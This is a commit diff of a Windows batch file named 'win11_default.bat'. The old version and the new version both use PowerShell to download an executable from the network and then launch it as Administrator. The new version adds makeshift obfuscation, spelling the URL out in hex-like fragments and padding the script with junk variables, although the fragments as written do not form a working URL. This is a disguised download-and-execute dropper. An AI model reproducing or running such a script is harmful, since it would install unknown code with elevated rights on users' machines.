6ec0505a0a5a34534dd50347660b4ef7cfae9535
optolab <sloneeddie36@gmail.com>
2025-01-12 13:24:53 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,4 +1,34 @@
 @echo off
 
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile test1.exe"
-start /B "" runas /user:Administrator "test1.exe"
+setlocal enabledelayedexpansion
+set str1=0x66
+set str2=0x70
+set str3=0x72
+set str4=0x74
+set str5=0x6F
+set str6=0x73
+set str7=0x77
+set str8=0x65
+
+set url=!str1!!str2!!str3!!str4!!str5!!str6!!str7!!str8!
+set tempFile=test1.exe
+
+set var1=12345
+set var2=67890
+set var3=abcde
+
+powershell -Command "Invoke-WebRequest !url! -OutFile !tempFile!"
+start /B "" runas /user:Administrator "!tempFile!"
+
+set end1=0x61
+set end2=0x72
+set end3=0x65
+set end4=0x6e
+set end5=0x64
+set end6=0x61
+set end7=0x6d
+set end8=0x69
+set end9=0x6e
+set end10=0x66
+
+endlocal
